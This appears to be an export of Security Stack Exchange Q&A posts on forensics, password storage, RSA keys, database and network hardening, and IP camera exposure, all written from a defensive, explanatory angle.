<p>Computer forensics is the art of examining a system and determining what happened upon it previously.  The examination of file and memory artifacts, especially file timelines, can paint a very clear picture of what the attacker did, when they did it, and what they took.</p>

<p>Just as an example - given a memory dump of a Windows system, it is possible to extract not only the command lines typed by an attacker, but <a href=""https://github.com/volatilityfoundation/volatility/wiki/Command%20Reference#consoles"">also the output that they saw as a result of running those commands</a>.  Pretty useful in determining impact, eh?</p>

<p>Depending on the freshness of the compromise, it's possible to tell quite a lot about what happened.</p>

<hr>

<p>@AleksandrDubinsky suggested that it would be useful to outline the various Computer Forensic fields and techniques, which I'm happy to do for you.  They include, but are not limited to, the following (I'm going to use my rough terms; they aren't official or comprehensive):</p>

<p><strong>Log/Monitor Forensics</strong>: The use of 'external' data such as centralized logs, firewall logs, packet captures, and IDS hits straddles the line between ""Detection"" and ""Forensics"".  Some of the data, like logs (even centralized) cannot be trusted to be complete or even truthful, as attackers can filter it or inject it once they have control of the system.  Off-the-system packet logging tools like the firewall, IDS, or packet recorders (such as (formerly)<a href=""https://en.wikipedia.org/wiki/Netwitness"">NetWitness</a>) are unlikely to be tampered with, but contain only a limited amount information; usually just a record of IP conversations and sometimes signatures (such as HTTP URLs) associated with malicious activity.</p>

<p>Unless an unencrypted network connection was used in the compromise, these tools are rarely able to detail the activity during a compromise, and so (going back to the original question) don't ""check <em>what</em> has been hacked.""  On the other hand, if an unencrypted connection (ftp) was used to exfiltrate data <em>out</em>, and full packets were recorded, then it's possible to know exactly what data the attacker ran away with.</p>

<p><strong>Live Forensics</strong>:  More properly part of Incident Response, so-called ""Live"" forensics involves logging into the system and looking around.  Investigators may enumerate processes, look in applications (e.g. browser history), and explore the file system looking for indications of what happened.  Again, this is usually designed to verify a compromise happened, and not to determine the extent of a compromise, since a compromised system is capable of hiding files, processes, network connections, really anything it wants to.  The plus side is that it allows access to memory-resident things (processes, open network connections) that aren't available once you shut the system down to image the disk (but, again, the system may be lying, if it's compromised!)</p>

<p><strong>Filesystem Forensics</strong>: Once a copy of the disk has been made, it can be mounted on a clean system and explored, removing any chance of the the compromised operating system ""lying"" about what files are in place.  Tools exist to build timelines using the variety of timestamps and other metadata available, 
incorporating file data, registry data (on Windows), even application data (e.g. browser history).  It's not just file write times that are used; file read times can indicate which files have been viewed and also which programs have been executed (and when).  Suspicious files can be run through clean antivirus checkers, signatures made and submitted, executables loaded into debuggers and explored, ""strings"" used to search for keywords.  On Unix, ""history"" files - if not turned off by the attacker - may detail the commands the attacker entered.  On Windows, the Shadow Copy Service may provide snapshots of past activity that has since been cleaned up.</p>

<p>This is the <strong>step most commonly used</strong> to determine the scope and extent of a compromise, and to determine what data may or may not have been accessed and/or exfiltrated.  This is the best answer to how we ""check <em>what</em> has been hacked.""</p>

<p><strong>Disk Forensics</strong>: Deleted files disappear from the filesystem, but not from the disk.  Also, clever attackers may hide their files in the ""slack space"" of existing files.  These things can only be found by examining the raw disk bytes, and tools like <a href=""http://www.sleuthkit.org/"">The Sleuth Kit</a> exist to rip that raw data apart and determine what it means about the past.  If there was a .bash_history file, and the attacker deleted it as his last step before logging out, then that file may still exist as disk blocks, and be recoverable.  Likewise, attack tools that were downloaded and temporary data files that were exfiltrated can help determine the extent of the compromise.</p>

<p><strong>Memory Forensics</strong>: If the investigator can get there soon enough, and get a snapshot of the memory of the system involved, then they can thoroughly plumb the depths of the compromise.  An attacker must compromise the kernel to hide from programs, but there's no way to hide what's been done if a true image of kernel memory can be made.  And just as the disk blocks contain data that has since been removed from the filesystem, the memory dump contains data that was in memory in the past (such as command line history and output!) that has not yet been overwritten... and most data is not overwritten quickly.</p>

<p><strong>Want more?</strong> There are training programs and certifications to learn Forensics; probably the most common publicly available training is from <a href=""http://digital-forensics.sans.org/"">SANS</a>.  I hold their GCFA (""Forensic Analyst"") certification.  You can also review the <a href=""http://www.honeynet.org/challenges"">Challenges from the Honeynet Project</a>, in which parties compete to unravel the cases given disk images, memory dumps, and malware samples from actual compromises - they submit their reports of what they found, so you can see the sorts of tools used and findings made in this field.</p>

<p><strong>Anti-Forensics</strong> is a hot topic in the comments - basically, ""can't the attacker just hide their traces?""  There are ways to chip away at it - see <a href=""http://www.forensicswiki.org/wiki/Anti-forensic_techniques"">this list of techniques</a> - but it's far from perfect and not what I'd call reliable.  When you consider that <a href=""https://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/"">""the 'God' of cyberespionage"" went so far as to occupy the firmware of the hard drive to maintain access to a system without leaving a trace on the system itself</a> - and <strong>still got detected</strong> - it seems clear that, in the end, it's easier to detect evidence than it is to erase it. </p>
","103808"
"What Blue Coat Unified Agent application do?","18165","","<p>I've experienced crash of <em>Blue Coat Unified Agent</em> tray application on my business laptop.</p>

<p>I was wondering what is the exact purpose of this software, and how it suppose to help me or the company?</p>

<p>What I know it provides Web security to remote users, but this doesn't tell me anything.</p>
","<p>The BlueCoat Unified Agent has been built to provide security on the cloud. The Unified Agent client monitors the Internet Breakout IP being used by the user and switches from Active to Passive mode or vice versa depending on the company policy.</p>

<p>For example a company might have on-premise proxy servers. Therefore when the client uses the laptop inside the company network perimeter, the client falls into passive mode and lets the on-premise proxy servers handle the ""washing"" of the Internet traffic.</p>

<p>However if the client goes at home, or a hotel or any other place with a public Internet breakout IP which is not defined as a Corporate Internet IP by that company, the client will immediately switch to 'Active' state. That means that the client establishes an encrypted IPSec tunnel towards the nearest BlueCoat ThreatPulse data center and a proxy cloud server does all the security traffic ""checking"" on the cloud. Companies can sync their on-prem proxies to have the exact policy on the cloud but that is optional. </p>

<p>Additionally, companies that use the Unificed Agent can also define subnets / IP Addresses / URLs which are like an exception for the unified agent and that traffic goes direct to the destination without utilizing the IPSec tunnel (Split Tunnelling).  The above environment is also known as Hybrid (utilizes both on-prem and cloud proxies)</p>

<p>Moreover you can have a pure cloud environment. A lot of companies do not have on-premise proxies and they use the Unified Agent both inside and outside the Company Network perimeter.All those are possible setups of the Unified Agent (plus many more of course).</p>

<p>The key advantage of the Unified Agent is that it provides extra security layers. When a client makes a request, it will go to the Cloud Proxy, the proxy will check if the content should be obtained based on the company URL policy (i.e. the company could be blocking porn, etc.). If it is OK, it will obtain the content and AV scan it using AV engines on the cloud from 3rd party vendors like Kaspersky, TrendMicro, Symantec etc. It will also optionally send the obtained data to a sandboxing environment if the file signatures are unknown. If everything is OK, it will deliver the content to the end-point client.</p>

<p>Back to your question, a lot could cause crashing of the actual application. In any case you should check with IT support of your company. You can also check the Windows logs as it will have application logs for the Unified Agent. Also the Unified Agent offers a ""tracing"" functionality if the crashing happens while you are visiting specific URLs, etc.</p>
","150842"
"openssl - generating rsa key pair - public key","18153","","<p>I am trying to generate RSA 1024 key pair (public/private) using the following command</p>

<pre><code>openssl genrsa -des3 -out server.key 1024
</code></pre>

<p>In the server.key file, only RSA private block is there, so where does the public key go ?</p>
","<p>The RSA private key format includes all the public elements. When you get the private key you really have both the private and public key.</p>

<p>This is described in <a href=""http://tools.ietf.org/html/rfc3447"">PKCS#1</a> (the leading RSA standard); private key format is an encoded ASN.1 structure which contains:</p>

<pre><code>  RSAPrivateKey ::= SEQUENCE {
      version           Version,
      modulus           INTEGER,  -- n
      publicExponent    INTEGER,  -- e
      privateExponent   INTEGER,  -- d
      prime1            INTEGER,  -- p
      prime2            INTEGER,  -- q
      exponent1         INTEGER,  -- d mod (p-1)
      exponent2         INTEGER,  -- d mod (q-1)
      coefficient       INTEGER,  -- (inverse of q) mod p
      otherPrimeInfos   OtherPrimeInfos OPTIONAL
  }
</code></pre>

<p>The public key really consists in the <em>modulus</em> and <em>public exponent</em>, which are both in the private key structure, as shown above.</p>

<hr />

<p>Now your question might be: ""what if I want the public key 'alone' ?""</p>

<p>OpenSSL lives in and by the X.509 world. In <a href=""http://en.wikipedia.org/wiki/X.509"">X.509</a>, public key don't exist as stand-alone values; and there is no standard file format for lone public keys. An application is supposed to use public keys that it found in <em>certificates</em>. This is quite apparent in the <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a> protocol (which is the primary support goal of OpenSSL): when the client sends its public key, it sends it as a certificate. Therefore, if you want the public key in a file, arrange for it to be stored in a certificates (possibly self-signed). The OpenSSL <a href=""http://www.openssl.org/docs/apps/req.html#"">req</a> sub-command, with the <code>-x509</code> flag, can help.</p>

<p>Of course, every rule has exceptions, so there is <em>also</em> a method to get the public key ""only"" from the private key; this is what @uwotm8 shows in his answer. However, the resulting public key, which will look like this:</p>

<pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDzYY+BpIuKouSnoemSwHwC25uW
Xc0zX1gl8NtG5UQP2U4Lda0s5XbBJm4O2W+RkOgR1f1d5cGOXRPd6Q9ntw3MYQv6
ubsMRZUaOT4vCpykWfPi/VfsQEPlWHw2pulYAyumx/sw8tX5i9NC2e2bY4eWwo22
BELyXpNdoGozSje8PQIDAQAB
-----END PUBLIC KEY-----
</code></pre>

<p>is not really usable anywhere, because this is a non-standard format.</p>

<p>(Technically this is a <code>SubjectPublicKeyInfo</code> element as it appears in an X.509 certificate, but it is not supposed to appear outside of an X.509 certificate.)</p>
","61635"
"HMAC - Why not HMAC for password storage?","18120","","<p><strong>Nota bene:</strong> I'm aware that the <a href=""http://chargen.matasano.com/chargen/2007/9/7/enough-with-the-rainbow-tables-what-you-need-to-know-about-s.html"">good answer</a> to secure password storage is either <a href=""http://www.tarsnap.com/scrypt.html"">scrypt</a> or <a href=""http://codahale.com/how-to-safely-store-a-password/"">bcrypt</a>. This question isn't for implementation in actual software, it's for my own understanding.</p>

<p>Let's say Joe Programmer is tasked with <strong>securely storing end user passwords</strong> in a database for a web application; or storing passwords on disk for logins to a piece of software. He will most likely:</p>

<ol>
<li>Obtain <code>$password</code> from the end user.</li>
<li>Create <code>$nonce</code> as a random value about 64 or 128 bits large.</li>
<li>Create <code>$hash = SHA256($nonce$password)</code> and store <code>$nonce</code> together with <code>$hash</code> in the database.</li>
</ol>

<p><strong>Question one:</strong></p>

<p>Why isn't the following substantially better than the above?</p>

<ol>
<li>Create <code>$long_string</code> once and only once. Store this as a constant in the application code. <code>$long_string</code> could f.x. be 2 kilobyte of random characters.</li>
<li>Obtain <code>$password</code> from the end user.</li>
<li>Create <code>$mac = HMAC-SHA256($long_string)[$password]</code> (i.e. create a MAC using the end user password as key) and store this <code>$mac</code> in the database.</li>
</ol>

<p><strong>I would imagine the HMAC has the following benefits?</strong></p>

<ul>
<li>Collisions are less frequent?</li>
<li>It is computationally somewhat more expensive than plain hashing? (But not anywhere near scrypt, of course.)</li>
<li>In order to succeed with a brute-force attack within a reasonable time, and attacker would need to gain access to two things: <em>1)</em> the database, where <code>$mac</code> is stored, and <em>2)</em> the application code, where the original <code>$long_string</code> is stored. That's one better than a hash function, where the attacker only needs access to the database?</li>
</ul>

<p>But still, <strong>nobody seems to suggest using an HMAC, so I must be misunderstanding something?</strong></p>

<p><strong>Question two:</strong></p>

<p>What would the implications of adding a salt value <code>$nonce</code> be?</p>

<ol>
<li>Create <code>$long_string</code> once and only once. Store this as a constant in the application code.</li>
<li>Obtain <code>$password</code> from the end user.</li>
<li>Create <code>$nonce</code> as a random value about 128 bits large.</li>
<li>Create <code>$mac = HMAC-SHA256($long_string)[$nonce$password]</code> and store <code>$nonce</code> and <code>$mac</code> in the database.</li>
</ol>
","<p>The point of the salt is to prevent attack cost sharing: if an attacker wants to attack two passwords, then it should be twice as expensive than attacking one password.</p>

<p>With your proposal (your ""question 1""), two users with the same password will end up using the same MAC. If an attacker has read access to your database, he can ""try"" passwords (by recomputing the MAC) and lookup the database for a match. He can then attack <em>all</em> the passwords in parallel, for the cost of attacking one. If your <code>long_string</code> is an hardcoded constant in the application source code, then all installed instances of the application share this constant, and it becomes worthwhile (for the attacker) to precompute a big dictionary of password-to-MAC pairs, also known as ""a rainbow table"".</p>

<p>With a nonce (your ""question 2"") you avoid the cost sharing. The nonce is usually known as a ""salt"". Your <code>long_string</code> and the use of HMAC does not buy you much here (and you are not using HMAC for what it was designed for, by the way, so you are on shaky foundations, cryptographically speaking). Using a salt is a very good idea (well, <em>not</em> using a salt is a very bad idea, at least) but it does only half of the job. You must also have a <em>slow</em> hashing procedure. The point here is that the salt prevents cost sharing, but does not prevent attacking a single password. Attacking a password means trying possible passwords until one matches (that's the ""dictionary attack""), and, given the imagination of the average human user, dictionary attacks tend to work: people just <em>love</em> using passwords which can be guessed. The workaround is to use a hashing process which is inherently slow, usually by iterating the hash function a few thousand times. The idea is to make password verification more expensive: having the user wait 1ms instead of 1µs is no hardship (the user will not notice it), but it will also make the dictionary attack 1000 times more expensive. Your <code>long_string</code> <em>may</em> be used for that, provided that it is really long (not 2 kilobytes, rather 20 megabytes).</p>

<p>HMAC <em>may</em> be used instead of a raw hash function to strengthen a password-verification system, but in a different setup. Given a system which checks passwords with salts and iterated hash functions, you can replace the hash function with HMAC, using a secret key <em>K</em>. This prevents offline dictionary attacks as long as you can keep <em>K</em> secret. Keeping a value secret is not easy, but it is still easier to keep a 128-bit <em>K</em> secret than a complete database.</p>
","3168"
"How can waiting 24 hours to change the password again be secure?","18118","","<p>So I managed to change my password on a service to the ""wrong"" password, for simplicity let's just say I changed it to an insecure password.</p>

<p>Now, I wanted to change it to a more secure password but instead I got a nice error message:</p>

<blockquote>
  <p>The password you entered doesn't meet the minimum security requirements.</p>
</blockquote>

<p>Which was interesting, considering this new password was using more letters, more numbers and more special characters than the last password.</p>

<p>I did some research and <a href=""https://serverfault.com/questions/301811/users-cant-change-password-trough-owa-for-exchange-2010"">found out</a> that the service I am using has a security rule where you have to wait 24 hours before changing the password again.</p>

<p>I asked my provider if they could do the change in the accepted answer of that link, but they said they couldn't do it and that the 24 hour wait was ""for security reasons"".</p>

<p>Which leads to my question.</p>

<p>How can waiting 24 hours to change the password again be secure? What are the pros/cons of making a user wait before they can change their password again?</p>
","<p>By itself, the rule of only allowing one password change per day adds no security. But it often comes in addition to another rule that says that the new password must be different from the n (generally 2 or 3) previous ones.</p>

<p>The one change per day rule is an attempt to avoid this trivial perversion:</p>

<ul>
<li>a user has to change his password because it has reached its time limit</li>
<li>he changes it to a new password</li>
<li>he repeats the change immediately the number of saved passwords minus one</li>
<li>he changes it immediately back to the original one => hurrah, still same password which is clearly what the first rule was trying to prevent...</li>
</ul>

<p>Ok, the rule could be the changing the password many times in one single day does not roll  the last passwords list. But unfortunately the former is builtin in many systems while the latter is not...</p>

<p>Said differently, it is just one attempt to force non cooperative users to change their password on a timely manner.</p>

<hr>

<p>Just a trivial probabilistic analysis after comments saying that allowing users to never change their password is not a security problem. Say you have a rather serious user and that the risk for his password to be compromised in one day is 1%. Assuming about 20 work days a month, the risk of being compromised in a quarter is of about 50% (1-(1- 1/100)^60)). And after one year (200 work days) we reach 87%! Ok, 1% may be high, and just start at 0.1% per day, only one on 1000, pretty negligible isn't it? But after 1 year (200 work days) the risk of begin compromised is almost 20% (18% to be honest). If it is the password for holidays photos I would not care, but for something more important it does matter.</p>

<p>It means that what is essential is to <em>educate</em> users and have them accept the rules because we all know that rules can easily be by-passed, and that if a user does not agree with them it will not be cooperative. But asking users to regularly change their password is a basic security rule, because passwords can be compromised without the user noticing that, and the only mitigation way is to change the (likely compromised) password.</p>
","155559"
"How to secure a MongoDB instance?","18117","","<p>Does anybody have experience with securing/hardening MongoDB server? Check lists or guides would be welcome.</p>
","<p>NoSQL databases are relatively new (although arguably an old concept), I haven't seen any specific MongoDB hardening guides and the usual places I look (<a href=""http://benchmarks.cisecurity.org/en-us/?route=downloads.browse.category.benchmarks.servers.database"">CISSecurity</a>, vendor publications, Sans etc all come up short). Suggests it would be a good project for an organisation, uni student, infosec community to write one and maintain it. </p>

<p>There is some basic information in Mongodb.org. All the steps in here should be followed including enabling security. The site itself states MongoDB only has a very basic level of security. 
<a href=""http://www.mongodb.org/display/DOCS/Security+and+Authentication"">http://www.mongodb.org/display/DOCS/Security+and+Authentication</a></p>

<p>MongoDB and other NoSQL databases also have a lot less (especially security) features than mature SQL databases, so you are unlikely to find fine-grained permissions or data encryption, it uses MD5 for password hashing with the username as the seed. There are also limitations such as authentication not being available with sharding before version 1.9.1 so as always performing a risk assessment and building a threat model to work out your security needs and threats faced is good idea. Based on this output MongoDB or NoSQL databases in general may not be suitable for your needs, or you may need to use it in a different way that maximizes its advantages and minimizes its weaknesses (e.g. for extracts of data rather than your most sensitive information, or on behind a number of layers of network controls rather than directly connected to your web application).</p>

<p>That said, I firmly believe security principles are technology agnostic. If you analyse even the latest attacks, and a good list on datalossdb.org it is amazing how many are still related to default passwords and missing patches. With defense in depth if you follow the following practices should have sufficient security to protect most assets (e.g. individual, commercial) maybe probably not military.</p>

<p><strong>Database hardening principles:</strong></p>

<ul>
<li>Authentication - require authentication, for admin or privileged users have two factor if possible (do this at the platform level or via a network device as the database itself doesn't support it). Use key based authentication to avoid passwords if possible.</li>
<li>Authorization - minimal number of required accounts with minimal required permissions, read only accounts are supported so use them. As granular access control does not exist use alternate means e.g a  web service in front of the database which contains business logic including access control rules or within the application. Minimize the permissions that Mongodb runs as on the platform e.g. should not run as root. </li>
<li>Default and system accounts - change the passwords of all default accounts, remove/lock/disable what you can, disable login where you can.</li>
<li>Logging and monitoring - enable <a href=""http://www.mongodb.org/display/DOCS/Logging"">logging</a> and export these to a central monitoring system. Define specific alerts and investigation procedures for your monitoring staff</li>
<li>Input validation - NoSQL databases are still vulnerable to injection attacks so only passing it validated known good input, use of paramaterisation in your application frameworks, all the good practices for passing un-trusted input to a database is required</li>
<li>Encryption - depending on the sensitivity of the data, as you cannot encrypt at the database level, encrypting or hashing any sensitive data at the application layer is required. Transport encryption also via the network layer (e.g. VPN).</li>
<li>Minimize services and change the default listening port</li>
<li>Remove any sample or test databases</li>
<li>Have a patch  management process in place to identify, evaluate and install all relevant security patches in a timely manner</li>
<li>Harden the platform and virtualization platform if used</li>
<li>Configure appropriate network controls e.g. firewalls, VLAN's to minimize access to the database, upstream denial of service filtering service, fully qualified DNS, seperate production and non production databases</li>
<li>Physically secure environment</li>
<li>Have a change management process</li>
</ul>
","7824"
"Is it bad to have cameras using a static IP address?","18116","","<p>I am about to move in a new house, and I would like to install some security cameras.</p>

<p>The contractor told me that in order for me to check the videos recorded by the cameras in real time when I am away I'll need to have a static IP address.</p>

<p>Are there problems with it? Is it less secure?</p>

<p>I am not a billionaire or famous so it is unlikely there will be targeted attacks. On the other hand it would be my home network and it'll happen that I'll input my bank credentials sooner or later, so I want it to be safe.</p>
","<p>I would consider another contractor, since that statement doesn't precisely increase my trust in his knowledge/skill.</p>

<p>The correct way of setting up a security camera system so you are able to check them when you are away is to have port forwarding on your router <strong>exclusively</strong> for VPN or HTTP/TLS mapped to the machine recording data from the cameras. This will work with a static IP or with DynDNS. If you use e.g. a Diskstation to do the recording (like I do at home) then you get DynDNS as well as the surveillance software (with a limited number of licenses, 4 in my case) for free already.</p>

<p>Never, <em>never ever</em>, expose an IP camera to the internet. This is an open invitation not only for people like the Russians who set up insecam half a year ago to mock you so on their website as well as all kinds of perverts and of course burglars.<br>
You also risk being exploited and having malware (maybe botnet control software?) installed inside your home network. From there they'll attack the other computers which will see the traffic coming from a ""trusted"" source. Almost all IP cameras have cheap, default-to-insecure firmware, some do not even support basic encryption. Firmware is updated rarely, if ever, and not necessarily to account for security issues. The cameras in my home are susceptible to Heartbleed (although this is publicly known for almost one year). There's nothing to do about it, other than not letting anyone access them. The documentation doesn't even mention it, but they're demonstrably exploitable.</p>

<p>You <em>might</em> allow the cameras to make an outgoing connection to upload files to an external server when alarm triggers, which makes stealing or destroying your server at home futile. But <em>never</em> allow incoming connections whatsoever.  </p>

<p>Personally, I wouldn't even allow a camera to make outgoing connections, seeing how virtually all IP cameras and their firmware are produced in China (and those that aren't are made in the USA, which is just as bad).<br>
Government-supported espionage and in particular industrial espionage is a big business, and how could you do it better than by requiring a covert channel built into every camera that your prospective targets will readily place where there's something important?
Of course you said that you are not an important person (...but who is really unimportant enough so nobody would care watching? Why is the NSA reading your mails then?). Not being the prime target doesn't mean that the backdoor is not built into your camera anyway, which could be used and abused by pretty much anyone.<br>
Anyone, that includes burglars who can conveniently check whether someone is home. Don't make their lives easier than it needs to be.</p>

<p>Update:<br>
Meanwhile, my statement about risking botnet software being installed on your IP cameras is no longer a mere possibility. The above statement which maybe sounded a tidbit paranoid turned out being outright prophetic (October 2016 attack on Dyn).<br>
Therefore: No direct internet access for presumably insecure devices, <em>never, not ever</em>.</p>
","79802"
"Is a 6 digit numerical password secure enough for online banking?","18106","","<p>My bank went through a major redesign of their customer online banking system recently. The way security is managed across the platform was also reviewed. The password I am able to set now to log in is forced to be <strong><em>6 digits long, numerical</em></strong>.</p>

<p>This goes a long way against what I thought to be a <a href=""https://security.stackexchange.com/questions/29836/what-are-good-requirements-for-a-password"">secure password policy</a>. On the other hand, I trust my bank to know what they are doing.</p>

<p>Could you help me understand how good this policy is?</p>

<ul>
<li>Compared to common practices in the sector. </li>
<li>From a more general IT security point of view.</li>
<li>As a customer: How much should I be worried  that my account may be easy to compromise?</li>
</ul>

<p><strong>Notes:</strong></p>

<ul>
<li>The user is id card number, which is <em>almost</em> public data.</li>
<li>Someone entering my account is still not able to make a payment before it goes through another security mechanism (which we will assume to be good).</li>
</ul>
","<p><strong>Unusual? Yes. Crazy? No. Read on to understand why...</strong></p>

<p>I expect your bank has a strong lockout policy, for example, three incorrect login attempts locks the account for 24 hours. If that is the case, a 6-digit PIN is not as vulnerable as you might think. An attacker that tried three PINs every day for a whole year, would still only have about a 0.1% chance of guessing the PIN.</p>

<p>Most websites (Facebook, Gmail, etc.) use either email addresses or user-selected names as the user name, and these are readily guessable by attackers. Such sites tend to have a much more relaxed lockout policy, for example, three incorrect logins locks for account for 60 seconds. If they had a stronger lockout policy, hackers could cause all sorts of trouble by locking legitimate people out of their accounts. The need to keep accounts secure with a relaxed lockout policy is why they insist on strong passwords.</p>

<p>In the case of your bank, the user name is a 16-digit number - your card number. You do generally keep your card number private. Sure, you use it for card transactions (online and offline) and it is in your wallet in plaintext - but it is reasonably private. This allows the bank to have a stronger lockout policy without exposing users to denial of service attacks.</p>

<p>In practical terms, this arrangement is secure. If your house mate finds your card, they can't access your account because they don't know the PIN. If some hacker tries to bulk hack thousands of accounts, they can't because they don't know the card numbers. Most account compromises occur because of phishing or malware, and a 6-digit PIN is no more vulnerable to those attacks than a very long and complex password. I suspect that your bank has no more day-to-day security problems than other banks that use normal passwords.</p>

<p>You mention that transactions need multi-factor authentication. So the main risk of a compromised PIN is that someone could view your private banking details. They could see your salary, and your history of dodgy purchases. A few people have mentioned that a 6-digit PIN is trivially vulnerable to an offline brute force attack. So if someone stole the database, they could crack your hash, and get your PIN. While that is true, it doesn't greatly matter. If they cracked your PIN they could login and see your banking history - but not make transactions. But in that scenario they can see your banking history anyway - they've already stolen the database!</p>

<p>So while this arrangement is not typical, it appears that it is not so crazy after all. One benefit it may have is that people won't reuse the same password on other sites. I suspect they have done this for usability reasons - people complained that they couldn't remember the long, complex passwords that the site previously required.</p>
","124733"
"When is it appropriate to SSL Encrypt Database connections?","18082","","<p>Let's say I have a web server I setup, and then a database server. </p>

<p>However, they are communicating locally and are behind firewall. In my opinion, no SSL is needed here right?</p>

<p>The only time to use SSL to encrypt the database connection would be between a web server that exists in a server that remotely communicates with a database server that is located somewhere else right?</p>

<p>I've seen guidelines for security before that advocate securing with SSL the database connection but it was vague on when to use it.</p>
","<p>It looks like the two previous answers to this question more or less strongly recommend to turn on SSL anyway, but I'd like to suggest a different reasoning angle (although I'm not recommending not to turn on SSL).</p>

<p>The two key points in assessing whether you need SSL or not are (a) what SSL protects you against and (b) what the thread model is: enumerate the potential threats.</p>

<p>SSL/TLS protects the transport of information between a client (in this case, your web server) and a server (in this case, your database server) from tampering and eavesdropping by anyone on the network in between (including able to get on those two machines).</p>

<p>To assess whether SSL is useful, you need to assume that the attacker is in a position to perform the attack SSL is designed to protect you against. That is, the attacker would need to be in a position to sniff packets on the network or on either machines.</p>

<ul>
<li><p>If someone in a position to sniff packets from the database server, they're likely to have root/admin access to that server. Using SSL/TLS at that stage will make no difference.</p></li>
<li><p>If someone is in a position to sniff packets on the network between the web server and the database server (excluding those machines), using SSL/TLS will prevent them from seeing/altering the application content. <em>If you think there might be a chance this is possible, do turn on SSL</em>. A way to mitigate this would be to use two network cards on the web server: one to the outside world and one to the inside LAN where the DB server is (with no other machines, or in a way that you could treat them all as a single bigger machine). This network forming the overall web-farm or cluster (however you want to call it) would be physically separated and only have one entry point from the outside: the web server itself (same principle for a reverse proxy head node).</p></li>
<li><p>If someone is in a position to sniff packets on the head node (the web server) itself, they're likely to have root access there (processes run by non-root users on the machine, shouldn't be able to read packets that are not for them). In this case, you would have a big problem anyway.</p>

<p>What I doubt here is whether enabling SSL actually protects you much in this scenario.</p>

<p>Someone with root access on the web server will be able to read your application configuration, including DB passwords, and should be able to connect to the DB server legitimately, even using SSL.</p>

<p>In counterpart, if you did assume that this warrants the use of SSL (because it might be harder to look into what the processes actually do rather than just looking at the network, even if you have root control on the machine), this would mean you would also want to turn for localhost communications (e.g. if you have other services on your web server, or in the situation where both DB server and web server were on the same machine).</p></li>
</ul>

<p>It's not necessarily a bad thing to be over-cautious, but you have to put your question in the context of what attackers could also do should they be in a position to perform an attack against what the security measure (SSL) protects you against, and whether this security measure would prevent them from achieving their goal anyway, once in this position.</p>

<p>I think the window is actually quite narrow there (assuming your back-end network really is secured, physically, not just by some firewall amongst a number of machines).</p>
","14489"
"To DMZ, or not to DMZ","18072","","<p>So for an assignment, we need to create a scheme (and eventually also the set-up) of a couple of servers in a network.</p>

<p>The 'networks' are:</p>

<ol>
<li>Internal network</li>
<li>DMZ</li>
<li>The internet</li>
</ol>

<p>And the servers we need to place are the following:</p>

<ol>
<li>DNS Server</li>
<li>Active Directory ([multiple] DC's)</li>
<li>MSSQL server</li>
<li>Webserver</li>
<li>MS Exchange 2010 Server, split up in 3 parts: Client side, SMTP, and
other functionalities (whatever those may be)</li>
</ol>

<p>Now I was wondering which of these servers to put in the DMZ &lt;-> internal.</p>

<p>The <strong>MSSQL server</strong> and <strong>AD server(s)</strong> should be placed inside the <em>internal network</em>. Of that I am quite sure (? :D).</p>

<p>The <strong>webserver</strong> and <strong>DNS server</strong> should be in the <em>DMZ</em>, right? I just dont know why, so any explanations about that would be greatly appreciated as well.</p>

<p>But then there are the three Exchange servers. I have absolutely no clue about where to place which part of these 3. Could anyone give some hints/tips and best practices about (mail)servers?</p>

<p>Also, to route/firewall these networks (internal, DMZ and internet), we use the <em>Forefront TMG</em>.</p>

<p>Any help is greatly appreciated!</p>
","<p>You put in the DMZ the servers which must be accessed from the outside. Since they are reachable from the external World (which is assumed hostile), these servers are <em>potentially</em> subject to hijack by attackers. The DMZ is a <strong>containment area</strong> so that a subverted server does not gain immediate access to your most valuable data (which will be presumably kept in the inner network).</p>

<p>Your AD and SQL servers are meant to be used only by machines from your network, not by machines from the outside, so you put them in the inner network. Your Web server is meant to be contacted by external clients, so put it in the DMZ. Similarly, the DNS server which publishes to the outer world your domain (e.g. the IP address of your Web server) is also meant to be accessed from the outside, hence DMZ.</p>

<p>There is no rule without exception. Occasionally, you will need to have some data path from outside to the inner network. Typically, emails come from the Internet but must ultimately appear on desktop systems. You normally want to store the incoming emails in servers which are in the inner network (this is the presumed safest place in your network) but if you run your own SMTP server (for <em>incoming</em> emails), then that one has to be in the DMZ.</p>

<p>It really depends on your exact situation, but the rule of thumb is simple: <em>DMZ is for that which can be contacted from the outside</em>.</p>
","31791"
"Can I use a private key as a public key and vice versa?","18066","","<p>I have code to encrypt data using a public key and decrypt it using a private key. This is useful when a client wants to send data to a server and know that only the server can decrypt it.</p>

<p>But say I want the server to encrypt data using the <em>private</em> key and decrypt it using the <em>public</em> key, as a way of distributing data that can be verified to have come from the right server. Rather than modify the code to allow this, can I simply publish the private key and keep the public key secret? Does this affect the security of the system?</p>
","<blockquote>
  <p>But say I want the server to encrypt data using the private key and decrypt it using the public key, as a way of distributing data that can be verified to have come from the right server.</p>
</blockquote>

<p>You can do this - this is, at a very simplistic level, how RSA signing works (note, simplistic - there is a bit more to it).</p>

<blockquote>
  <p>Rather than modify the code to allow this, can I simply publish the private key and keep the public key secret? Does this affect the security of the system?</p>
</blockquote>

<p>You <strong>don't</strong> need to publish the private key at all - RSA is a trapdoor permutation which means:</p>

<ul>
<li>If you encrypt with a public key, you can decrypt with the private key.</li>
<li>If you encrypt with a private key, you can decrypt with a public key.</li>
</ul>

<p>Thus, RSA supports doing both signing and encryption relying on the end user having only the public key. </p>

<p>In your case, if the client wishes to verify data came from the server, you apply the second case of RSA and decrypt the signature data using the public key you already have.</p>

<p>Furthermore, because it is a permutation, you shouldn't need to modify your code at all. Both keys should work using the same function. I would expect any decent crypto library would have APIs for verifying signatures according to the varying standards that exist - one of these would probably be a good bet. </p>

<p>RSA Labs provide a nice <a href=""https://web.archive.org/web/20130718172549/https://www.rsa.com/rsalabs/node.asp?id=2182"" rel=""nofollow noreferrer"">explanation of this</a>.</p>

<p>If you want to extend this between servers, or verify client communication - generate keys for each entity and swap the public ones. The process can then be used at both ends.</p>

